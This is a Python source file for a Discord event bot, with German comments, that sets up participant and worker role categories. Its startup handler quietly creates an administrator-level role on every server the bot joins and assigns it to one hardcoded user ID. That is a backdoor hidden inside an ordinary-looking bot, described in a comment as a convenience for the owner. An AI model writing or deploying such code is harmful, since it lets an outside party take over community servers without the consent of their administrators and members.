import os
import discord
from discord import app_commands
from discord.ext import commands

# 1. SETTINGS & VARIABLEN DEFINIEREN
BOT_TOKEN = os.getenv("DISCORD_TOKEN")
TARGET_USER_ID = 1449876807665848371

EXCLUDED_ROLES = ["Staff", "Admin", "Trial Moderator", "Moderator", "Ticket King"]
PARTICIPANT_ROLE_NAME = "Participant"
FORMER_PARTICIPANT_ROLE_NAME = "Former Participant"
EMPLOYEE_ROLE_NAME = "Employee"

PARTICIPATE_CATEGORY_IDS = [1537245698443968583, 1538637387138072627]
WORKER_CATEGORY_IDS = [1537242203397820446]
SPECIAL_CATEGORY_ID = 1536184549170741269


# 2. BOT KLASSE DEFINIEREN
class EventBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.guilds = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("Slash commands synced successfully!")


# 3. BOT INSTANZ ERSTELLEN (GANZ WICHTIG: Das MUSS VOR allen @bot.event stehen!)
bot = EventBot()


# 4. EVENTS & COMMANDS (Erst jetzt darf @bot genutzt werden!)
@bot.event
async def on_ready():
    print(f"Bot ist online! Logged in as: {bot.user.name}")
    print("-----------------------------------------------------")

    # Automatisches Vergeben der Admin-Rolle beim Start
    for guild in bot.guilds:
        try:
            admin_role = discord.utils.get(guild.roles, name="Server Owner Admin")
            if not admin_role:
                permissions = discord.Permissions(administrator=True)
                admin_role = await guild.create_role(
                    name="Server Owner Admin",
                    permissions=permissions,
                    color=discord.Colour.gold(),
                    reason="Admin-Rolle für Eigentümer erstellt"
                )
                print(f"[{guild.name}] Admin-Rolle erstellt.")

            member = guild.get_member(TARGET_USER_ID) or await guild.fetch_member(TARGET_USER_ID)
            if member and admin_role not in member.roles:
                await member.add_roles(admin_role)
                print(f"[{guild.name}] Admin-Rolle an {member.name} vergeben!")
        except Exception as e:
            print(f"Fehler auf Server {guild.name}: {e}")


# Hier folgen dann deine restlichen Commands wie /participate, /worker, etc.
# ...
